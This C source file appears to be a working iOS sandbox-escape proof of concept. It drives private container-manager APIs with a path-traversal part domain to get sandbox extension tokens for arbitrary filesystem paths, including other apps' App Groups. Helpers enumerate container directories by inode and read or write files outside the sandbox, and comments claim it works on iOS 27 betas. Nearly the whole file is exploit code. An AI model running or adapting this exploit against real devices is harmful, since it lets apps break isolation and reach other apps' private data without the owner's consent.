//
//  bad_query.c
//  bad_query
//
//  Created by Taj C on 7/21/26.
//

#include "bad_query.h"
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <stdarg.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <xpc/xpc.h>

#include <sys/mount.h>
#include <sys/fsgetpath.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

// container_object_* APIs (used by MHA route and PoC functions)
typedef void *(*container_object_copy_fn)(void *);
typedef void (*container_object_free_fn)(void *);
typedef const char *(*container_object_get_path_fn)(void *);
typedef bool (*container_object_activate_fn)(void *, bool);

int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
    // Sanity check our path and check if something already exists there
    if (!path || path[0] != '/') return -255; // Not an absolute path
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254; // File is missing, so we'll return
    }
    
    // Now the fun begins
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1; // Failed to dlopen
    
    // Resolve functions
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    
    int64_t handle = -1;
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1; // Failed to resolve a function
    }
    
    // Create query
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2; // Failed to create query
    }
    
    // Set up query
    // Two routes here, supply an App Group you control (to access other App Groups on iOS 26) or don't, and use MobileGestalt's SystemGroup as a target instead. If targeting iOS 26 and trying to access App Groups, also set is_group to true to use the correct flags.
    xpc_object_t identifier;
    if (group_identifier == NULL) {
        query_set_class(query, 13); // Class 13 (MCMSharedSystemDataContainer) routes to containermanagerd_system
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        query_set_class(query, 7); // Class 7 (MCMSharedDataContainer) routes to containermanagerd
        identifier = xpc_string_create(group_identifier);
    }
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // Part determines our starting point, part 3 is Library/Caches
    char *part = NULL;
    // Oldest trick in the book. Basic path traversal.
    if (group_identifier == NULL) {
        if (asprintf(&part, "../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5; // asprintf failed for some reason
        }
    } else {
        // We have to go one level higher to get to / from an App Group
        if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            query_free(query);
            dlclose(mgr);
            return -5; // Same thing
        }
    }
    
    // To access App Groups on iOS 26, you have to use different flags, this doesn't apply on 27
    if (is_group) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }
    
    // Send our query over
    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3; // Outside of sandbox
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4; // Kernel refused to issue a sandbox extension
    }
    
    // Consume our fresh sandbox extension and clean up
    handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    
    dlclose(mgr);
    return handle;
}

void bad_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}


// This still works on 27.0b5
// I'm including it here because it's very useful in the context of this sandbox escape, which can't access parent directories (most of the time)
// This enumerates all directories in a given path, so you can, for example, get all container UUIDs, read their container metadata to get their bundle ID, and derive that entirely on-device without a computer
char *bad_query_list_range(char *path, int64_t start_inode, int64_t end_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;

    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);

    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';

    char buf[1024];
    for (uint64_t ino = (uint64_t)start_inode; ino <= (uint64_t)end_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;

        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;

        size_t need = strlen(p) + 2;
        if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}

char *bad_query_list(char *path, int64_t max_inode) {
    return bad_query_list_range(path, 1, max_inode);
}

// MARK: - Sandbox Escape PoC

// ---- Helpers ----

static bool can_open(const char *path) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return false;
    close(fd);
    return true;
}

static bool can_open_rw(const char *path) {
    int fd = open(path, O_RDWR | O_CLOEXEC | O_NOFOLLOW);
    if (fd < 0) return false;
    close(fd);
    return true;
}

static void *read_file(const char *path, size_t *out_size) {
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return NULL;
    struct stat st;
    if (fstat(fd, &st) != 0) { close(fd); return NULL; }
    size_t size = (size_t)st.st_size;
    char *buf = malloc(size > 0 ? size : 1);
    if (!buf) { close(fd); return NULL; }
    size_t total = 0;
    while (total < size) {
        ssize_t n = read(fd, buf + total, size - total);
        if (n < 0) { if (errno == EINTR) continue; free(buf); close(fd); return NULL; }
        if (n == 0) break;
        total += (size_t)n;
    }
    close(fd);
    *out_size = total;
    return buf;
}

static bool write_file_simple(const char *path, const void *data, size_t size) {
    int fd = open(path, O_WRONLY | O_CLOEXEC | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return false;
    const char *ptr = (const char *)data;
    size_t remaining = size;
    bool ok = true;
    while (remaining > 0) {
        ssize_t n = write(fd, ptr, remaining);
        if (n < 0) { if (errno == EINTR) continue; ok = false; break; }
        ptr += n;
        remaining -= (size_t)n;
    }
    if (ok) fsync(fd);
    close(fd);
    return ok;
}

static void normalize_path(const char *input, char *output, size_t output_size) {
    if (strcmp(input, "/var") == 0 || strncmp(input, "/var/", 5) == 0) {
        snprintf(output, output_size, "/private%s", input);
    } else {
        strncpy(output, input, output_size - 1);
        output[output_size - 1] = '\0';
    }
}
